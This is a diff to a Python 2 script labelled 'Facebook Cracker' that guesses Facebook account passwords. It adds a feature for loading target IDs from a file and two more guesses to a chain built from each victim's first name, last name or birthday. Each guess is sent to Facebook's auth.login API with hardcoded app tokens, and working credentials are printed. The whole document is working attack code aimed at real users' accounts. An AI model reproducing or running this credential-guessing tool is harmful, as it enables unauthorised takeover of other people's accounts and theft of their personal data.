@@ -55,7 +55,8 @@ banner2 = """%s
     .___.__  __          .
     [__ [__)/  `._. _. _.;_/ _ ._.
     |   [__)\__.[  (_](_.| \(/,[
-     %s v1.5 %s -  Facebook Cracker
+               %s v2.0 %s -  
+    =====[ Facebook Cracker ]=====
          %s By Mr.KaitoX %s 
 """%(R,Y,V,G,N)
 
@@ -63,7 +64,7 @@ banner = """%s
     .___.__  __          .
     [__ [__)/  `._. _. _.;_/ _ ._.
     |   [__)\__.[  (_](_.| \(/,[ 
-             %s  v 1.5 
+             %s  v 2.0
      %s 
 """%(R,Y,N)
 
@@ -198,7 +199,7 @@ def menu():
 
 
 def pilih():
-    zedd = raw_input(G + 'RootSec ' + R + '\xe2\x96\xb6 ' + W)
+    zedd = raw_input(G + '~@adapcsg ' + R + '\xe2\x96\xb6 ' + W)
     if zedd == '':
         print '\x1b[1;91m [!] Empty command'
         pilih()
@@ -218,9 +219,9 @@ def pilih():
         menu()
     elif zedd == '7':
         os.system('clear')
-        print ' \033[1;93mRecoded : \033[1;92mMr.KaitoX\n \033[1;93mTeam : \033[1;92mPinoy Rootsec \n \033[1;93mFacebook : \033[1;92mhttps://facebook.com/kaitoXspiker \n\033[1;93m Github : \033[1;92mhttps://www.github.com/mrkaitox \n\033[1;93m YouTube : \033[1;92mhttps://youtube.com/kaitolegion'
+        print ' \033[1;93mRecoded : \033[1;92mMr.KaitoX\n \033[1;93mTeam : \033[1;92madapcsg  \n \033[1;93mFacebook : \033[1;92mhttps://facebook.com/kaitolegionofficial \n\033[1;93m Github : \033[1;92mhttps://www.github.com/mrkaitox \n\033[1;93m YouTube : \033[1;92mhttps://youtube.com/kaitolegion'
         print '\n'
-        print G+' Special Greetz:'+V+' \n Infinite \n Ph.Osus \n Ph.Bloodz \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider'
+        print G+' Special Greetz:'+V+' \n Infinite \n Ph.Osus \n Ph.Bloodz \n AnonPrixor \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider'
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
     elif zedd == '8':
@@ -616,13 +617,14 @@ def super():
     print banner
     print W + ' 1.' + G + ' Cracked from friends Facebook'
     print W + ' 2.' + G + ' Cracked from Group Facebook'
+    print W + ' 3.' + G + ' Cracked from File ID'
     print W + ' 0.' + R + ' Exit'
     print ''
     pilih_super()
 
 
 def pilih_super():
-    peak = raw_input(G + ' RootSec\x1b[1;91m >\x1b[1;97m ')
+    peak = raw_input(G + ' adapcsg\x1b[1;91m >\x1b[1;97m ')
     if peak == '':
         print '\x1b[1;91m[!] Empty command'
         pilih_super()
@@ -652,7 +654,17 @@ def pilih_super():
         s = json.loads(re.text)
         for i in s['data']:
             id.append(i['id'])
-
+    
+    elif peak == '3':
+    	os.system('clear')
+    	try:
+    		print banner
+    		idlist = raw_input('\x1b[1;91m[+] \x1b[1;92m File ID  \x1b[1;91m:\x1b[1;97m')
+    		for line in open(idlist, 'r').readlines():
+    			id.append(line.strip())
+    	except:
+    		pass
+    
     elif peak == '0':
         menu()
     else:
@@ -666,6 +678,7 @@ def pilih_super():
         try:
             a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
             b = json.loads(a.text)
+            # Password Guess 1
             pass1 = b['first_name'] + '123'
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
@@ -674,6 +687,7 @@ def pilih_super():
             elif 'www.facebook.com' in q['error_msg']:
                 print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
             else:
+            	# Password Guess 2
                 pass2 = b['first_name'] + '12345'
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
@@ -682,6 +696,7 @@ def pilih_super():
                 elif 'www.facebook.com' in q['error_msg']:
                     print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
                 else:
+                	# Password Guess 3
                     pass3 = b['last_name'] + '123'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
@@ -690,14 +705,36 @@ def pilih_super():
                     elif 'www.facebook.com' in q['error_msg']:
                         print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
                     else:
-                        lahir = b['birthday']
-                        pass4 = lahir.replace('/', '')
+                    	# Password Guess 4
+                        birth = b['birthday']
+                        pass4 = birth.replace('/', '')
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
                             print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
                         elif 'www.facebook.com' in q['error_msg']:
                             print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
+                        else:
+                            # Password Guess 5
+                            pass5 = b['last_name'] + '04'
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                            	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
+                            elif 'www.facebook.com' in q['error_msg']:
+                            	print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
+                            else:
+                            	# Password Guess 6
+                            	pass6 = b['first_name'] + '04'
+                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                q = json.load(data)
+                                if 'access_token' in q:
+                                	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
+                                elif 'www.facebook.com' in q['error_msg']:
+                            	    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
+                                else:
+                                	pass
+                            		
         except:
             pass
 
